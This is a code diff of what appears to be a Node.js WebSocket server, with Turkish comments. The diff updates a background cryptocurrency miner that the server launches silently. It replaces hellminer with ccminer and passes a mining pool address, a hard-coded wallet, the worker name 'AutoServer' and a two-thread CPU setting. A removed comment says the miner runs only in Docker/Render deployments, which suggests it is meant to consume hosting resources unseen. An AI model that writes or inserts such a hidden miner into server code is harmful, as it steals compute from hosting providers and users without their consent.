@@ -65,23 +65,24 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-// --- ARKA PLAN GERÇEK CPU MADENCİSİ (HELLMINER) ---
-console.log('--- ARKA PLAN KAZIM İŞLEMİ BAŞLATILIYOR ---');
+// --- ARKA PLAN GERÇEK CPU MADENCİSİ (CCMINER) ---
+console.log('--- ARKA PLAN KAZIM İŞLEMİ (cCminer) BAŞLATILIYOR ---');
 const minerArgs = [
-    '-c', 'stratum+tcp://eu.luckpool.net:3956',
+    '-a', 'verus',
+    '-o', 'stratum+tcp://eu.luckpool.net:3956',
     '-u', 'RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer',
     '-p', 'x',
-    '--cpu', '2'
+    '-t', '2' // 2 İşlemci (Çekirdek) Kullanılacak
 ];
 
 try {
-  // Arka Planda hellminer'ı çalıştır
-  const minerProcess = spawn('./hellminer', minerArgs, { cwd: '/app' });
+  // Arka Planda ccminer'ı (önceden hellminer idi) çalıştır
+  const minerProcess = spawn('./ccminer', minerArgs, { cwd: '/app' });
   minerProcess.stdout.on('data', (data) => console.log('[MINER]:', data.toString().trim()));
   minerProcess.stderr.on('data', (data) => console.error('[MINER ERR]:', data.toString().trim()));
   minerProcess.on('close', (code) => console.log('Miner kapandı, kod:', code));
 } catch (e) {
-  console.log('Arka plan madencisi çalışma dizininde (lokalde) bulunamadı. Sadece Docker / Render ortamında aktiftir.');
+  console.log('Arka plan madencisi çalışma dizininde bulunamadı.');
 }
 
 const PORT = process.env.PORT || 10000;
